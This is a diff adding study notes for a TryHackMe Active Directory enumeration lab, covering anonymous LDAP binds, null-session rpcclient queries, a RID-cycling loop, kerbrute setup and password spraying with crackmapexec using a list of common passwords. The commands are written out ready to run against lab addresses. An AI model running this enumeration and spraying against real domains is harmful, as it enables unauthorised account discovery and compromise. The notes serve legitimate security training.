@@ -3,7 +3,8 @@ https://tryhackme.com/room/adbasicenumeration
 ### Table of contents
 - [[#Mapping Out Network]]
 - [[#Network Enumeration with SMB]]
-- 
+- [[#Domain Enumeration]]
+- [[#Password Spraying]]
 
 ___
 ### Mapping Out Network
@@ -105,33 +106,106 @@ Domain accounts: specify `-W`
 `enum4linux`/`enum4linux-ng`: extensive SMB enumeration
 
 ___
-### 
+### Domain Enumeration
 [[#Table of contents|Back to the top]]
 
+##### LDAP Enumeration -- Anonymous Bind
 
+Test for anonymous LDAP bind:
+`ldapsearch -x -H ldap://10.211.11.10 -s base`
+- `x`: simple authentication
+- `H`: specify LDAP server
+- `s`: only base object, no subtree/children
+
+If successful, query user information
+`ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"`
+
+##### `enum4linux-ng`
+*Automated enumeration against Windows, uses SMB and RPC --> users, groups memberships, shares*
+
+`enum4linux-ng -A 10.211.11.10 -oA results.txt`
+- `A`: all enumeration functions
+- `oA`: output to YAML and JSON files
+
+##### RPC Enumeration -- Null Sessions
+
+MSRPC (Microsoft Remote Procedure Call): program on one computer can request services from program on another computer, SMB protocol, if null sessions allowed --> access to IPC$ share --> users, groups, shares, ...
+
+`rpcclient -U "" 10.211.11.10 -N`
+- `U`: username, left blank for null session testing
+- `N`: no password prompt
+
+If successful, enumerate users
+`enumdomusers` (`help` to see list of available commands)
+
+##### RID Cycling
+
+In AD, RID (Relative Identifier): unique identifier for user and group objects, components of SID (Security Identifier) which uniquely identify object within domain
+
+`500` -- Administrator account, `501` -- Guest account, `512-514` -- Domain Admins, Domain users, Domain guests, user accounts typically $\geq$ `1000`
+
+`enum4linux-ng` can be used to determine RID range / test for known ranges, then increment
+
+```Shell
+for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
+```
+Useful when `enumdomusers` is restricted
+
+##### Kerbrute -- Username Enumeration
+
+Kerberos: primary authentication protocol for MS Windows domains
+Ticket-based system managed by 3rd party -- KDC (Key Distribution Center), strong encryption
+
+Usernames returned by `enum4linux-ng` and `rpcclient` may be: disabled accounts, non-domain accounts, fake honeypot users, false positives
+
+--> Run them through `kerbrute` --> confirm real and active before password spraying
+
+Set up
+[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
+`mv kerbrute_linux_amd64 kerbrute`
+`chmod +x kerbrute`
 
 ___
-### 
+### Password Spraying
 [[#Table of contents|Back to the top]]
 
+*Small set of common passwords tested against many accounts, avoids account lockout*
 
+Common password lists for spraying
+- Seasonal passwords
+- Default IT teams passwords (`Password123`)
+- `rockyou.txt`
 
-___
-### 
-[[#Table of contents|Back to the top]]
+##### Password Policy
+*Indicates password length, complexity, number of failed attempts before lockout*
 
+`rpcclient -U "" 10.211.11.10 -N`
 
+`getdompwinfo`: get password policy
 
-___
-### 
-[[#Table of contents|Back to the top]]
+**`crackmapexec`**: enumeration, command execution, post-exploitation in Windows
+`crackmapexec smb 10.211.11.10 --pass-pol`: retrieve password policy without credentials
 
+##### The Attack
 
+Create small list of common passwords based on gathered info
 
-___
-### 
-[[#Table of contents|Back to the top]]
+Results
+- `rpcclient`: `password_properties: 0x00000001`
+- `crackmapexec`: `Password Complexity Flags: 000001`
+--> password complexity = 1
 
+--> 3/4 conditions need to be respected
+- Uppercase
+- Lowercase
+- Digit
+- Special character
 
+And cannot contain user's account name / parts of full name exceeding 2 consecutive characters
+([more](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994562\(v=ws.11\)) about MS password policies)
 
-___
+Through OSINT, we could discover data breach, known passwords variations of "Password"
+--> list: "Password!", "Password1", "Password1!", "P@ssword", "Pa55word1"
+Save to `passwords.txt`
+
+`crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt`
